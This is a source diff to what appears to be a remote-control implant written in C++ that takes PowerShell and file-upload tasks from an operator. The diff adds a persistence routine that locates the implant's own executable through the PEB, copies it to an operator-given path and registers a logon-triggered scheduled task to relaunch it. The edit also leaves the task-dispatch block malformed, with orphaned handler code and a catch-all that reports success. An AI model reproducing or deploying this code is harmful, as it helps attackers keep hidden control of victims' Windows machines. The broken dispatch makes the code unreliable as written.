@@ -12,7 +12,23 @@
 #include <windows.h>
 #include <psapi.h>
 
+#include <winternl.h>
+#include <initguid.h>
+#include <ole2.h>
+#include <mstask.h>
+#include <msterr.h>
+#include <objidl.h>
+#include <wchar.h>
+#include <ocidl.h>
+#include <taskschd.h>
+#include <sstream>
+#include <random>
+#include <cctype> 
 #include <iostream>
+#include <shlwapi.h>
+#include <comdef.h>
+#include "shlobj.h"
+
 #include <memory>
 #include <array>
 #include <cmath>
@@ -24,6 +40,8 @@
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment (lib, "ole32")
+#pragma comment(lib,"shlwapi.lib")
 
 template <class... Ts>
 struct overloaded : Ts...
@@ -74,17 +92,17 @@ void Agent::Start()
             // Retrieve the next task from the queue.
             auto request = taskManager.GetNextTask();
 
-            // Dispatch the task based on its request type.
-            // Each handler returns a Response containing the task result.
-            Response result = std::visit(
-                overloaded{
-                    // Handle PowerShell command requests.
-                    [this](const TaskRequest<CommandPowershell> &psRequest) -> Response
-                    {
-                        return this->ExecutePowerShell(
-                            psRequest.taskID,
-                            psRequest.data);
-                    },
+            Response result = std::visit(overloaded{
+                [this](const TaskRequest<CommandPowershell>& psRequest) -> Response {
+                    return this->ExecutePowerShell(psRequest.taskID, psRequest.data);
+                },
+                [this](const TaskRequest<CommandWinTask>& winTaskRequest) -> Response {
+                    return this->CreateWindowsTaskW(winTaskRequest.taskID, winTaskRequest.data);
+                },
+                [](const auto& unhandledRequest) -> Response {
+                    return TaskResponse<TaskSuccess>{ };
+                }
+            }, request);
 
                     // Handle file upload requests.
                     [this](const TaskRequest<CommandUploadFile> &uploadRequest) -> Response
@@ -141,6 +159,156 @@ void Agent::Start()
         // Pause for five seconds before checking in again.
         Sleep(5000);
     }
+}
+
+typedef struct _LDR_DATA_TABLE_ENTRY2 {
+    LIST_ENTRY InMemoryOrderLinks;
+    PVOID Reserved2[2];
+    PVOID DllBase;
+    PVOID EntryPoint;
+    PVOID Reserved3;
+    UNICODE_STRING FullDllName;
+    BYTE Reserved4[8];
+    PVOID Reserved5[3];
+    union {
+        ULONG CheckSum;
+        PVOID Reserved6;
+    };
+    ULONG TimeDateStamp;
+} LDR_DATA_TABLE_ENTRY2, * PLDR_DATA_TABLE_ENTRY2;
+
+
+LPCWSTR GetLocalModule() {
+    PPEB                   pPeb = NULL;
+    PPEB_LDR_DATA          pLdrData = NULL;
+    PLDR_DATA_TABLE_ENTRY2 pDataTableEntry = NULL;
+
+    pPeb = (PEB*)(__readgsqword(0x60));
+    pLdrData = (PPEB_LDR_DATA)(pPeb->Ldr);
+    pDataTableEntry = (PLDR_DATA_TABLE_ENTRY2)(pLdrData->InMemoryOrderModuleList.Flink);
+
+    return (LPCWSTR)pDataTableEntry->FullDllName.Buffer;
+}
+
+BOOL DropFileToDiskW(const std::wstring& path) {
+    HRESULT hr = E_FAIL;
+    HANDLE  hFile = INVALID_HANDLE_VALUE;
+    HANDLE  hDropFile = INVALID_HANDLE_VALUE;
+    LPCWSTR pModule = NULL;
+    DWORD   dwFileSize = NULL;
+    DWORD   dwNumberOfBytesRead = NULL;
+    DWORD   dwNumberOfBytesWritten = NULL;
+    DWORD   dwPathLenBytes = NULL;
+    LPVOID  pBaseAddress = NULL;
+    BOOL    isSuccess = FALSE;
+
+    pModule = GetLocalModule();
+    hFile = CreateFileW(pModule, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) goto e_func;
+
+    dwFileSize = GetFileSize(hFile, NULL);
+    if (dwFileSize == INVALID_FILE_SIZE) goto e_func;
+
+    pBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
+    if (!pBaseAddress) goto e_func;
+
+    isSuccess = ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL);
+    if (!isSuccess) goto e_func;
+
+    hDropFile = CreateFileW(path.c_str(), GENERIC_READ | GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    isSuccess = WriteFile(hDropFile, pBaseAddress, dwFileSize, &dwNumberOfBytesWritten, NULL);
+    if (!isSuccess) goto e_func;
+
+e_func:
+    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
+    if (hDropFile != INVALID_HANDLE_VALUE) CloseHandle(hDropFile);
+    if (pBaseAddress) HeapFree(GetProcessHeap(), 0, pBaseAddress);
+    return isSuccess;
+}
+
+
+Response Agent::CreateWindowsTaskW(const int& taskID, const CommandWinTask& request){
+    HRESULT         hr = E_FAIL;
+    BOOL            isSuccess = FALSE;
+    ITask* pITask = NULL;
+    IPersistFile* pIPersistFile = NULL;
+    ITaskTrigger* pITaskTrigger = NULL;
+    ITaskFolder* pITaskFolder = NULL;
+    std::wstring    uuid = {};
+    std::wstring    wPath = {};
+    ITaskScheduler* pITS = 0;
+    WORD            piNewTrigger = 0;
+    DWORD           dwFlags = 0;
+    TASK_TRIGGER    pTrigger;
+    IEnumWorkItems* pEnumWorkItems = NULL;
+    LPWSTR          userName = NULL;
+
+    std::wstring path(request.path.begin(), request.path.end());
+    std::wstring username(request.username.begin(), request.username.end());
+    std::wstring workItemName(request.taskName.begin(), request.taskName.end());
+
+    isSuccess = DropFileToDiskW(path);
+    if (!isSuccess) goto e_func;
+
+    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    if (FAILED(hr)) goto e_func;
+
+    hr = CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (void**)&pITS);
+    if (FAILED(hr)) goto e_func;
+
+    hr = pITS->NewWorkItem(workItemName.c_str(), CLSID_CTask, IID_ITask, (IUnknown**)&pITask);
+    if (FAILED(hr)) goto e_func;
+
+    hr = pITask->SetApplicationName(path.c_str());
+    if (FAILED(hr)) goto e_func;
+
+    hr = pITask->SetAccountInformation(username.c_str(), NULL);
+    if (FAILED(hr)) goto e_func;
+
+    hr = pITask->CreateTrigger(&piNewTrigger, &pITaskTrigger);
+    if (FAILED(hr)) goto e_func;
+
+    ZeroMemory(&pTrigger, sizeof(TASK_TRIGGER));
+    pTrigger.cbTriggerSize = sizeof(TASK_TRIGGER);
+    pTrigger.wBeginDay = 1;
+    pTrigger.wBeginMonth = 1;
+    pTrigger.wBeginYear = 1999;
+    pTrigger.TriggerType = TASK_EVENT_TRIGGER_AT_LOGON;
+
+    hr = pITaskTrigger->SetTrigger(&pTrigger);
+    if (FAILED(hr)) goto e_func;
+
+    hr = pITask->GetFlags(&dwFlags);
+    if (FAILED(hr)) goto e_func;
+
+    dwFlags |= TASK_FLAG_RUN_ONLY_IF_LOGGED_ON;
+    hr = pITask->SetFlags(dwFlags);
+    if (FAILED(hr)) goto e_func;
+
+    hr = pITask->QueryInterface(IID_IPersistFile, (void**)&pIPersistFile);
+    hr = pIPersistFile->Save(NULL, TRUE);
+    if (FAILED(hr)) goto e_clean;
+
+    pITask->Run();
+    goto e_func;
+
+e_clean:
+    pITS->Delete(workItemName.c_str());
+e_func:
+    if (pITask) pITask->Release();
+    if (pITaskTrigger) pITaskTrigger->Release();
+    if (pIPersistFile) pIPersistFile->Release();
+    if (pITaskFolder) pITaskFolder->Release();
+    CoUninitialize();
+
+    if (FAILED(hr))
+    {
+        _com_error err(hr);
+        return CreateTaskResponse(taskID, WIN_TASK, NO_CODE, TASK_ERROR, TaskError{ hr, err.ErrorMessage() });
+    }
+
+    return CreateTaskResponse(taskID, WIN_TASK, NO_CODE, SUCCESS, TaskSuccess{"Successfully persisted via windows task"});
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
